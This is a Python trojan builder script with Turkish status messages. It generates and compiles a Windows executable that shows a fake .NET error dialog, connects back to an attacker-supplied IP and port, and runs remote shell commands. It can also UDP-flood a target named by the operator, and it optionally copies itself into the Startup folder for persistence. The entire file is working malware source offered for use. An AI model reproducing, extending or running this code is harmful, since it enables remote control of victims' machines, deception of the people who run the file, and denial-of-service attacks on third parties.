import os
import colorama
import sys
import subprocess
import shutil
from colorama import Fore, init
file = sys.argv[0]
current_path = os.path.dirname(file)
current_path = current_path.replace("/build", "")
init()
if len(sys.argv) < 7:
    sys.exit()

ip = sys.argv[1]
port = int(sys.argv[2])
error_message = sys.argv[3]
startup = sys.argv[4]
name = sys.argv[5]
icon = sys.argv[6]
if error_message == "default":
    error_message = "An error ocurred while starting the program, please check your .NET version"
else:
    pass

startup_code = r'''
import shutil
import os
user = os.environ['USERPROFILE']

try:
    shutil.copy(__file__, rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
except:
    pass
'''
fake_message = f'''
import tkinter
from tkinter import messagebox

try:
    messagebox("Error", message="{error_message}")
except:
    pass
'''

code = f'''
import socket
import subprocess
import time
import random
try:
    import tkinter
except ImportError:
    pass
import json
import os
web = False

def stop_web():
    pass
    
def denial_service(ip, port):
    while True:
        command_stop = cmd_recv()
        if command_stop == "stop":
            break
        for i in range(1500):
            bytes = random._urandom(1490)
            sock.sendto(bytes, (ip, int(port)))

def cmd_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def output_send(data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())  

def attack():
    while True:
        time.sleep(3)
        try:
            sock.connect((HOST_IP, PORT))
        except:
            pass
        command = cmd_recv()
        if "ip" in command:
            send = command.split()
            if web == False:
                denial_service(send[1], send[2])
            else:
                continue
        elif command == "kill":
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)


HOST_IP = '{ip}' 
PORT = {port}
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def connection():
    while True:
        time.sleep(3)
        try:
            sock.connect((HOST_IP, PORT))
            attack()
            break
        except:
            pass

connection()
'''
all = '\n'+fake_message + '\n'+code+'\n'
if startup == "yes":
    all += '\n'+startup_code+'\n'
else:
    pass
name = name.strip(" ")
print(Fore.BLUE+'[i]'+Fore.RESET+' Trojan Python dosyası yaziliyor...')
try:
    def again():
        with open(current_path+'/output/'+name+'.py', "a") as f:
            f.write(all)
    again()
    if os.path.exists(current_path+'/output/'+name+'.py'):
        pass
    else:
        again()
    use = ""
    print(Fore.BLUE+'[i]'+Fore.RESET+' Lütfen bekleyin, Python dosyası yürütülebilir dosyasına dönüştürülür...')
    os.system("cd "+current_path+'/output')
    if ".py" in name:
        use = name.split('.py')
    else:
        use = [name, '.py']
    if icon == "default":
        exe = subprocess.getoutput(f'pyinstaller -y -w -F -n {current_path}/output/{use[0]} --clean {current_path}/output/{name}.py')
    else:
        shutil.copy(current_path+'/icons/'+icon, current_path+'/output')
        exe = subprocess.getoutput(f'pyinstaller -y -w -F -n {current_path}/output/{use[0]} --icon={current_path}/icons/{icon} --clean {current_path}/output/{name}.py')
    dir = os.listdir(current_path+'/output')
    usage = shutil.disk_usage(current_path)
    print(Fore.BLUE+'[i]'+Fore.RESET+' Dizin Temizleniyor...')
    for i in dir:
        if ".py" in i or ".exe" in i:
            continue
        else:
            os.remove(current_path+'/output/'+i)
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Lütfen Ana dizininizde "dist" klasör arayın, "dist/{name}.exe" ')
except:
    pass
sys.exit()